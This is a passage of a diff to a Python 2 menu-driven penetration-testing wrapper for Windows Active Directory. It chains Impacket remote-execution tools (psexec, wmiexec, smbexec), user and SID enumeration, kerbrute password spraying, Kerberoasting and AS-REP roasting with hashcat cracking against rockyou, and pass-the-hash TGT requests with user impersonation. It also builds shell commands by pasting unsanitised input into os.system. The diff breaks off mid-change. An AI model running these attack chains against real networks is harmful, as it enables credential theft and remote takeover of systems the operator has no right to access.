@@ -44,6 +44,7 @@ if len(sys.argv) < 3:
 
 BH1 = sys.argv[1]	# NEO4J USERNAME
 BH2 = sys.argv[2]	# NEO4J PASSWORD
+BUG = 0			# DEBUG COMMANDS
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -88,9 +89,13 @@ def gettime(value):
    return variable
 
 def command(command):
-#   print colored("Using Command: " + command + "\n", 'white')	# COMMENT OUT TO STOP DEBUGGING
+   if BUG == 1:
+      print colored(command, 'white')
    os.system(command)
-   raw_input("\nPress ENTER to continue...")
+   return
+
+def prompt():
+   selection = raw_input("\nPress ENTER to continue...")
    return
 
 def display():
@@ -281,7 +286,7 @@ def display():
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
-os.system("clear")
+command("clear")
 print "__        _____ _   _   __  __    _    ____ _____ _____ ____      " 
 print "\ \      / /_ _| \ | | |  \/  |  / \  / ___|_   _| ____|  _ \     " 
 print " \ \ /\ / / | ||  \| | | |\/| | / _ \ \___ \ | | |  _| | |_) |    " 
@@ -307,25 +312,25 @@ else:
    print "[-] Work area already exists..."
 
 if not os.path.exists("USERS.tmp"):		# HOLDS INITIAL USERS DATA
-   os.system("touch USERS.tmp")
+   command("touch USERS.tmp")
    print "[-] File USERS.tmp created..."
 else:
    print "[-] File USERS.tmp already exists..."
 
 if not os.path.exists("users.txt"):		# HOLDS CURRENT FILTERED USER LIST
-   os.system("touch users.txt")
+   command("touch users.txt")
    print "[-] File users.txt created..."
 else:
    print "[-] File users.txt already exists..."
 
 if not os.path.exists("SHARES.tmp"):		# HOLDS INITIAL SHARE DATA
-   os.system("touch SHARES.tmp")
+   command("touch SHARES.tmp")
    print "[-] File SHARES.tmp created..."
 else:
    print "[-] File SHARES.tmp already exists..."
 
 if not os.path.exists("SECRETS.tmp"):		# HOLDS INITIAL SECRETS DATA
-   os.system("touch SECRETS.tmp")
+   command("touch SECRETS.tmp")
    print "[-] File SECRETS.tmp created..."
 else:
    print "[-] File SECRETS.tmp already exists..."
@@ -434,8 +439,9 @@ else:
 
 print "[*] Starting neo4j database..."
 
-os.system("neo4j start   > log.txt 2>&1")
-os.system("neo4j console >> log.txt 2>&1")
+command("touch log.txt")
+command("neo4j start   >> log.txt 2>&1")
+command("neo4j console >> log.txt 2>&1")
 os.remove("log.txt")
 
 raw_input("\nPlease ENTER key to continue...")
@@ -449,7 +455,7 @@ raw_input("\nPlease ENTER key to continue...")
 # -------------------------------------------------------------------------------------
 
 while True: 
-   os.system("clear")
+   command("clear")
    PI1 = gettime(COL1)
    display()
    selection=raw_input("Please Select: ")
@@ -463,25 +469,25 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '0':
-      os.system("echo " + DNSN + " > config.txt")
-      os.system("echo " + TIP  + " >> config.txt")
+      command("echo " + DNSN + " > config.txt")
+      command("echo " + TIP  + " >> config.txt")
       if USR.rstrip(" ") == "\"\"":
-         os.system("echo '\"\"' >> config.txt")
+         command("echo '\"\"' >> config.txt")
       else:
-         os.system("echo " + USR  + " >> config.txt")     
+         command("echo " + USR  + " >> config.txt")     
       if PAS.rstrip(" ") == "\"\"":
-         os.system("echo '\"\"' >> config.txt")
+         command("echo '\"\"' >> config.txt")
       else:
-         os.system("echo " + PAS  + " >> config.txt")
-      os.system("echo " + FRST.rstrip("\n") + " >> config.txt") 
-      os.system("echo " + HST  + " >> config.txt")  
-      os.system("echo " + WGRP.rstrip("\n") + " >> config.txt")
-      os.system("echo " + HIP  + " >> config.txt")  
-      os.system("echo " + POR  + " >> config.txt")  
+         command("echo " + PAS  + " >> config.txt")
+      command("echo " + FRST.rstrip("\n") + " >> config.txt") 
+      command("echo " + HST  + " >> config.txt")  
+      command("echo " + WGRP.rstrip("\n") + " >> config.txt")
+      command("echo " + HIP  + " >> config.txt")  
+      command("echo " + POR  + " >> config.txt")  
       tmp = '\"' + PRM.rstrip(" ") + '\"'
-      os.system("echo " + tmp + " >> config.txt")  
-      os.system("echo " + PI1  + " >> config.txt")  
-      os.system("echo " + DIR  + " >> config.txt")  
+      command("echo " + tmp + " >> config.txt")  
+      command("echo " + PI1  + " >> config.txt")  
+      command("echo " + DIR  + " >> config.txt")  
       
       os.remove("SECRETS.tmp")
       os.remove("SHARES.tmp")
@@ -500,14 +506,15 @@ while True:
 
    if selection =='1':
       BAK = DNSN
-      DNSN = raw_input("Please enter DNS SERVER name: ")
-      if DNSN == "":
-         DNSN = BAK      
-      else:
+      DNSN = raw_input("\nPlease enter DNS SERVER name: ")
+      if DNSN != "":
          if len(DNSN) < 19:
             DNSN = padding(DNSN, COL1)
-      os.system("echo '" + TIP.rstrip(" ") + "\t" + DNSN.rstrip(" ") + "' >> /etc/hosts")
-      command("echo '\nDNS SERVER " + DNSN.rstrip(" ") + " has been added to /etc/hosts'")
+         command("echo '" + TIP.rstrip(" ") + "\t" + DNSN.rstrip(" ") + "' >> /etc/hosts")
+         print "DNS SERVER " + DNSN.rstrip(" ") + " has been added to /etc/hosts..."
+         prompt()
+      else:
+         DNSN = BAK      
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -519,11 +526,11 @@ while True:
 
    if selection =='2':
       BAK = TIP
-      TIP = raw_input("Please enter REMOTE IP address: ")
-      if TIP == "":
-         TIP = BAK      
-      else:
+      TIP = raw_input("\nPlease enter REMOTE IP address: ")
+      if TIP != "":
          TIP = padding(TIP, COL1)
+      else:
+         TIP = BAK      
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -535,15 +542,14 @@ while True:
 
    if selection == '3':
       BAK = USR
-      USR = raw_input("Please enter USERNAME: ")
-      if USR == "":
-         USR = BAK      
-      else:
+      USR = raw_input("\nPlease enter USERNAME: ")
+      if USR != "":
          USR = padding(USR, COL1)
-      
-      for a in range(0, MAX):
-         if US[a].rstrip(" ") == USR.rstrip(" "):
-            FRST = PA[a]	# UPDATE HASH VALUE TO MATCH USER.
+         for a in range(0, MAX):
+            if US[a].rstrip(" ") == USR.rstrip(" "):
+               FRST = PA[a]	# UPDATE HASH VALUE TO MATCH USER.
+      else:
+         USR = BAK      
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -555,11 +561,11 @@ while True:
 
    if selection == '4':
       BAK = PAS
-      PAS = raw_input("Please enter PASSWORD: ")
-      if PAS == "":
-         PAS = BAK      
-      else:
+      PAS = raw_input("\nPlease enter PASSWORD: ")
+      if PAS != "":
          PAS = padding(PAS, COL1)
+      else:
+         PAS = BAK      
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -571,11 +577,12 @@ while True:
 
    if selection == '5':
       BAK = FRST
-      FRST = raw_input("Please enter HASH value: ")
-      if FRST == "":
-         FRST = BAK      
-      if len(FRST) < 19:
-         FRST = padding(FRST, COL1)
+      FRST = raw_input("\nPlease enter HASH value: ")
+      if FRST != "":
+         if len(FRST) < 19:
+            FRST = padding(FRST, COL1)
+      else:
+         FRST = BAK
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -587,14 +594,15 @@ while True:
 
    if selection == '6':
       BAK = HST
-      HST = raw_input("Please enter DOMAIN name: ")
-      if HST == "":
-         HST = BAK      
-      else:
+      HST = raw_input("\nPlease enter DOMAIN name: ")
+      if HST != "":
          if len(HST) < 19:
             HST = padding(HST, COL1)
-      os.system("echo '" + TIP.rstrip(" ") + "\t" + HST.rstrip(" ") + "' >> /etc/hosts")
-      command("echo '\nDOMAIN " + HST.rstrip(" ") + " has been added to /etc/hosts'")
+         command("echo '" + TIP.rstrip(" ") + "\t" + HST.rstrip(" ") + "' >> /etc/hosts")
+         print "DOMAIN " + HST.rstrip(" ") + " has been added to /etc/hosts..."
+         prompt()
+      else:
+         HST = BAK      
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -606,11 +614,12 @@ while True:
 
    if selection == '7':
       BAK = WGRP
-      WGRP = raw_input("Please enter DOMAIN SID value: ")
-      if WGRP == "":
+      WGRP = raw_input("\nPlease enter DOMAIN SID value: ")
+      if WGRP != "":
+         if len(WGRP) < 19:
+            WGRP = padding(WGRP, COL1)
+      else:
          WGRP = BAK      
-      if len(WGRP) < 19:
-         WGRP = padding(WGRP, COL1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -622,11 +631,11 @@ while True:
 
    if selection == '8':
       BAK = HIP
-      HIP = raw_input("Please enter SHARE name: ")
-      if HIP == "":
-         HIP = BAK
-      else:
+      HIP = raw_input("\nPlease enter SHARE name: ")
+      if HIP != "":
          HIP = padding(HIP,COL1)
+      else:
+         HIP = BAK
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
@@ -638,11 +647,11 @@ while True:
 
    if selection == '9':
       BAK = POR
-      POR = raw_input("Please enter IMPERSONATOR name: ")
-      if POR == "":
-         POR = BAK      
-      else:
+      POR = raw_input("\nPlease enter IMPERSONATOR name: ")
+      if POR != "":
          POR = padding(POR, COL1)
+      else:
+         POR = BAK
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
@@ -654,11 +663,11 @@ while True:
 
    if selection == '10':
       BAK = PRM
-      PRM = raw_input("Please enter Windows COMMAND: ")
-      if PRM == "":
-         PRM = BAK      
-      else:
+      PRM = raw_input("\nPlease enter Windows COMMAND: ")
+      if PRM != "":
          PRM = padding(PRM, COL1)
+      else:
+         PRM = BAK
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
@@ -670,14 +679,13 @@ while True:
 
    if selection == '11':
       BAK = PI1
-      PI1 = raw_input("Please enter computer TIME: ")
-      if PI1 == "":
-         PI1 = BAK      
-      else:
-         CMD = "date --set=" + PI1
-         os.system(CMD)
+      PI1 = raw_input("\nPlease enter computer TIME: ")
+      if PI1 != "":
+         command("date --set=" + PI1)
          PI1 = padding(PI1, COL1)
          SKEW = 1
+      else:
+         PI1 = BAK      
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -688,16 +696,16 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '12':
-      directory = raw_input("Please enter new working DIRECTORY: ")
+      directory = raw_input("\nPlease enter new working DIRECTORY: ")
       if os.path.exists(directory):
-         print "Directory already Exists...."
+         print "Directory already exists...."
       else:
          if len(directory) > 0:
             os.mkdir(directory)
             DIR = directory
             DIR = padding(DIR, COL1)
             print "Working directory changed..."
-      raw_input("\nPress ENTER to continue...")           
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -709,14 +717,15 @@ while True:
 
    if selection == '13':
       if TIP[:5] != "EMPTY":
-         os.system("hostname -I > localip.txt")
+         command("hostname -I > localip.txt")
          localhost = linecache.getline('localip.txt', 1)
          os.remove("localip.txt")
          localhost = localhost.split(" ")
          localhost = localhost[1]
          command(PRO + "ping.py " + localhost.rstrip(" ") +  " " + TIP.rstrip(" "))
       else:
-         command("echo 'Remote IP address not specified...'")
+         print "Remote IP address not specified..."
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -728,15 +737,16 @@ while True:
 
    if selection == '14':
       if (HST[:5] == "EMPTY"):
-         command("echo 'Domain name not specified...'")
+         print "Domain name not specified..."
       if (USR[:2] == '""'):
-         command("echo 'User name not specified...'")
+         print "User name not specified..."
       if (PAS[:2] == '""'): 
-         command("echo 'Password not specified...'")
+         print "Password not specified..."
       else:
-         os.system("adidnsdump -u '" + HST.rstrip(" ") + "\\" + USR.rstrip(" ") + "' -p " + PAS.rstrip(" ") + " " + HST.rstrip(" ") + " --include-tombstoned -r")
-         os.system("sed -i '1d' records.csv")
+         command("adidnsdump -u '" + HST.rstrip(" ") + "\\" + USR.rstrip(" ") + "' -p " + PAS.rstrip(" ") + " " + HST.rstrip(" ") + " --include-tombstoned -r")
+         command("sed -i '1d' records.csv")
          command("\ncat records.csv")
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -750,7 +760,8 @@ while True:
       if DNSN[:5] != "EMPTY":
          command("fierce -dns " + DNSN.rstrip(" "))
       else:
-         command("echo 'DNS Server not specified...'")
+         print "DNS Server not specified..."
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -764,7 +775,8 @@ while True:
       if TIP[:5] != "EMPTY":
          command("nmap -sU -O -p 123 --script ntp-info " + TIP.rstrip(" "))
       else:
-         command("echo 'Remote IP address not specified...'")
+         print "Remote IP address not specified..."
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -778,7 +790,8 @@ while True:
       if (HST[:5] != "EMPTY") & (TIP[:5] != "EMPTY"):
          command("nmap -p 80 --script http-vhosts --script-args http-vhosts.domain=" + HST.rstrip(" ") + " " + TIP.rstrip(" "))
       else:
-         command("echo 'Domain name or IP address not specified...'")
+         print "Domain name or remote IP address not specified..."
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -792,7 +805,8 @@ while True:
       if TIP[:5] != "EMPTY":
          command("nmap -T4 -F " + TIP.rstrip(" "))
       else:
-         command("echo 'Remote IP address not specified...'")
+         print "Remote IP address not specified..."
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -806,7 +820,8 @@ while True:
       if TIP[:5] != "EMPTY":
          command("nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script 'default or (discovery and safe)' " + TIP.rstrip(" "))
       else:
-         command("echo 'Remote IP address not specified...'")
+         print "Remote IP address not specified..."
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -819,6 +834,7 @@ while True:
 
    if selection == '20':
       command(PRO + "getArch.py -target " + TIP.rstrip(" "))
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -830,6 +846,7 @@ while True:
 
    if selection =='21':
       command(PRO + "netview.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -target " + TIP.rstrip(" "))
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -841,6 +858,7 @@ while True:
 
    if selection =='22':
       command(PRO + "services.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " list")
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -852,6 +870,7 @@ while True:
 
    if selection == '23':
       command(PRO + "atexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " " + PRM.rstrip(" "))
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -863,6 +882,7 @@ while True:
 
    if selection == '24':
       command(PRO + "dcomexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " " + PRM.rstrip(" "))
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -874,11 +894,11 @@ while True:
 
    if selection == '25':
       os.remove("SHARES.tmp")
-      os.system(PRO + "psexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " cmd.exe > SHARES.tmp")
+      command(PRO + "psexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " cmd.exe > SHARES.tmp")
       command("cat SHARES.tmp")
     
-      os.system("sed -i '1,3d' SHARES.tmp")
-      os.system("sed -i -e 's/share //g' SHARES.tmp")
+      command("sed -i '1,3d' SHARES.tmp")
+      command("sed -i -e 's/share //g' SHARES.tmp")
 
       SH0  = linecache.getline('SHARES.tmp', 1)
       SH1  = linecache.getline('SHARES.tmp', 2)
@@ -958,6 +978,8 @@ while True:
       SHA10 = padding(SHA10, COL5)
       SHA11 = padding(SHA11, COL5)
 
+      prompt()
+
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
@@ -968,6 +990,7 @@ while True:
 
    if selection == '26':
       command(PRO + "smbexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -979,6 +1002,7 @@ while True:
 
    if selection == '27':
       command(PRO + "wmiexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " " + PRM.rstrip(" "))
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -990,6 +1014,7 @@ while True:
 
    if selection == '28':
       command(PRO + "ifmap.py " + TIP.rstrip(" ") + " 135")
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1001,7 +1026,9 @@ while True:
 
    if selection == '29':
       ifmap = raw_input("\nEnter MSRPC interface (ifmap) : ")     
-      command(PRO + "opdump.py " + TIP.rstrip(" ") + " 135 " + ifmap)
+      if ifmap != "":
+         command(PRO + "opdump.py " + TIP.rstrip(" ") + " 135 " + ifmap)
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1014,6 +1041,7 @@ while True:
 
    if selection == '30':
       command("enum4linux -v " + TIP.rstrip(" "))
+      prompt()
 
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1025,6 +1053,7 @@ while True:
 
    if selection =='31':
       command(PRO + "windapsearch.py -d " + TIP.rstrip(" ") + " -u " + HST.rstrip(" ") + "\\" + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -GUC --da --full")
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1036,14 +1065,15 @@ while True:
 
    if selection =='32':
       print "\n[+] Please wait....\n"
-      os.system(PRO + "lookupsid.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> DOMAIN.tmp")
+      command(PRO + "lookupsid.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> DOMAIN.tmp")
       command("cat DOMAIN.tmp")
-      os.system("cat DOMAIN.tmp | grep 'Domain SID' >> SID.tmp")
+      command("cat DOMAIN.tmp | grep 'Domain SID' >> SID.tmp")
       os.remove("DOMAIN.tmp")
       DOMSID = linecache.getline("SID.tmp", 1)
       os.remove("SID.tmp")
       if DOMSID != "":
          WGRP = DOMSID.replace('[*] Domain SID is: ',"")
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1058,11 +1088,11 @@ while True:
       os.remove("USERS.tmp")	# CLEAR WORK FILE
       os.remove("users.txt")	# CLEAR WORK FILE
 
-      os.system(PRO + "samrdump.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> USERS.tmp")
-      os.system("sed -i -n '/Found user: /p' USERS.tmp")	# SELECT ONLY FOUND USERS
-      os.system("sort USERS.tmp > USERS2.tmp")			# SORT USERS ALPHANUMERICALLY 
+      command(PRO + "samrdump.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> USERS.tmp")
+      command("sed -i -n '/Found user: /p' USERS.tmp")	# SELECT ONLY FOUND USERS
+      command("sort USERS.tmp > USERS2.tmp")			# SORT USERS ALPHANUMERICALLY 
       os.remove("USERS.tmp")
-      os.system("mv USERS2.tmp USERS.tmp")
+      command("mv USERS2.tmp USERS.tmp")
       
       for x in range (0, MAX):
          US[x] = linecache.getline('USERS.tmp', x+1)
@@ -1073,7 +1103,7 @@ while True:
             US[x] = padding(US[x], COL3)
             if US[x] != "":
                print "[-] Found user " + US[x]
-               os.system("echo " + US[x] + " >> users.txt")	# ASSIGN USERS NAME
+               command("echo " + US[x] + " >> users.txt")	# ASSIGN USERS NAME
             else:
                US[x] = "                                "	# ASSIGN EMPTY USERS
             PA[x] = "................................"		# RESET PASSWORDS
@@ -1082,7 +1112,8 @@ while True:
          US[11] = "Some users are not shown!!..."
          US[11] = padding(US[11], COL3)
 
-      command("echo '[*] All done!'")
+      print "[*] All done!"
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1094,6 +1125,7 @@ while True:
 
    if selection =='34':
       command(PRO + "rpcdump.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1106,6 +1138,7 @@ while True:
 
    if selection =='35':
       command(PRO + "reg.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " query -keyName HKLM\\\SOFTWARE\\\Policies\\\Microsoft\\\Windows -s")
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1117,6 +1150,7 @@ while True:
 
    if selection =='36':
       command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" "))
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1128,6 +1162,7 @@ while True:
 
    if selection == '37':
       command("smbmap -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -d " + HST.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + HIP.rstrip(" "))
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1139,6 +1174,7 @@ while True:
 
    if selection == '38':
       command("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + HIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" "))
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1150,6 +1186,7 @@ while True:
 
    if selection == '39':
       command("rpcclient -U " + USR.rstrip(" ") + "%" + PAS.strip(" ") + " " + TIP.rstrip(" "))
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1161,6 +1198,7 @@ while True:
 
    if selection == '40':
       command(PRO + "GetADUsers.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1172,13 +1210,12 @@ while True:
 
    if selection == '41':
       print "\n[+] Please wait...\n"
-      os.system("nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=" + HST.rstrip(" ") + ",userdb=users.txt " + TIP.rstrip(" ") + " >> KUSERS.tmp")
-      os.system("sed -i '/@/!d' KUSERS.tmp")
-      os.system("sort KUSERS.tmp > USERS2.tmp")
+      command("nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=" + HST.rstrip(" ") + ",userdb=users.txt " + TIP.rstrip(" ") + " >> KUSERS.tmp")
+      command("sed -i '/@/!d' KUSERS.tmp")
+      command("sort KUSERS.tmp > USERS2.tmp")
       os.remove("KUSERS.tmp")
       os.remove("USERS.tmp")	# CLEAR WORK FILE
-      os.remove("users.txt")	# CLEAR WORK FILE
-	
+      os.remove("users.txt")	# CLEAR WORK FILE	
       for x in range (0,MAX):
          US[x] = linecache.getline("USERS2.tmp", x+1)
          if US[x] != "":
@@ -1189,17 +1226,16 @@ while True:
             US[x] = padding(US[x], COL3)
             if US[x] != "                                ":
                print "[-] Found user " + US[x]
-               os.system("echo " + US[x] + " >> users.txt")	# ASSIGN FOUND USERS
+               command("echo " + US[x] + " >> users.txt")	# ASSIGN FOUND USERS
             else:
                US[x] = "                                "	# ASSIGN EMPTY USERS
-            PA[x] = "................................";		# RESET PASSWORDS
-      
+            PA[x] = "................................";		# RESET PASSWORDS      
       if US[12] != "":
          US[11] = "Some users are not shown!!..."
-         US[11] = padding(US[11], COL3)
-      
-      os.system("mv USERS2.tmp USERS.tmp")
-      command("echo '[*] All done!'")
+         US[11] = padding(US[11], COL3)      
+      command("mv USERS2.tmp USERS.tmp")
+      print "[*] All done!"
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1211,6 +1247,7 @@ while True:
 
    if selection =='42':
       command(PRO + "kerbrute.py -domain " + HST.rstrip(" ") + " -users users.txt -passwords /usr/share/wordlists/rockyou.txt")
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1224,10 +1261,11 @@ while True:
       if linecache.getline('users.txt', 1) != "":
          command(PRO + "GetUserSPNs.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -outputfile hashroast1.txt")
          print "\n[+] Cracking hash values if they exists...\n"
-         os.system("hashcat -m 13100 --force -a 0 hashroast1.txt /usr/share/wordlists/rockyou.txt -o cracked1.txt")
+         command("hashcat -m 13100 --force -a 0 hashroast1.txt /usr/share/wordlists/rockyou.txt -o cracked1.txt")
          command("strings cracked1.txt")
       else:
-         command("echo 'The file users.txt is empty...'") 
+         print "The file users.txt is empty..."
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1241,10 +1279,11 @@ while True:
       if linecache.getline('users.txt', 1) != "":
          command(PRO + "GetNPUsers.py -outputfile hashroast2.txt -format hashcat " + HST.rstrip(" ") + "/ -usersfile users.txt")
          print "\n[+] Cracking hash values if they exists...\n"
-         os.system("hashcat -m 18200 --force -a 0 hashroast2.txt /usr/share/wordlists/rockyou.txt -o cracked2.txt")
+         command("hashcat -m 18200 --force -a 0 hashroast2.txt /usr/share/wordlists/rockyou.txt -o cracked2.txt")
          command("strings cracked2.txt")
       else:
-         command("echo 'The file users.txt is empty...'")   
+         print "The file users.txt is empty..."
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1258,7 +1297,8 @@ while True:
       if PAS[:1] != "\"":
          FRST = binascii.hexlify(hashlib.new("md4", PAS.rstrip(" ").encode("utf-16le")).digest())
       else:
-         command("echo 'Password not found...'")
+         print "Password not found..."
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1272,31 +1312,31 @@ while True:
    if selection == '46':
       print "\n[+] Trying user " + USR.rstrip(" ") + "...\n"
       if PAS[:1] != "\"":
-         os.system(PRO + "getTGT.py " + HST.rstrip(" ") +  "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
-         os.system("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
+         command(PRO + "getTGT.py " + HST.rstrip(" ") +  "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
+         command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
       else:
          if FRST[:1] != "":
-            os.system(PRO + "getTGT.py " + HST.rstrip(" ") +  "/" + USR.rstrip(" ") + " -hashes :" + FRST)
-            os.system("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
+            command(PRO + "getTGT.py " + HST.rstrip(" ") +  "/" + USR.rstrip(" ") + " -hashes :" + FRST)
+            command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
          else:
-            os.command("echo 'User password or hash required...'")  
+            print "User password or hash required..."
       if os.path.exists(USR.rstrip(" ") + ".ccache"):
-         os.system(PRO + "psexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
+         command(PRO + "psexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
       else:
-          os.system("echo 'TGT was not generated...'")
-
+          print "TGT was not generated..."
       print "\n[+] Trying user " + POR.rstrip(" ") + " (IMPERSONATE)...\n"
       HASH = "................................"
       for x in range (0, MAX):
          if US[x].rstrip(" ") == POR.rstrip(" "):    # IMPERSONATE VALUE
             HASH = PA[x].rstrip(" ")                 # GET HASH
       if HASH[:1] != ".":
-         os.system(PRO + "getTGT.py " + HST.rstrip(" ") +  "/" + POR.rstrip(" ") + " -hashes :" + HASH)
-         os.system("export KRB5CCNAME=" + POR.rstrip(" ") + ".ccache")
+         command(PRO + "getTGT.py " + HST.rstrip(" ") +  "/" + POR.rstrip(" ") + " -hashes :" + HASH)
+         command("export KRB5CCNAME=" + POR.rstrip(" ") + ".ccache")
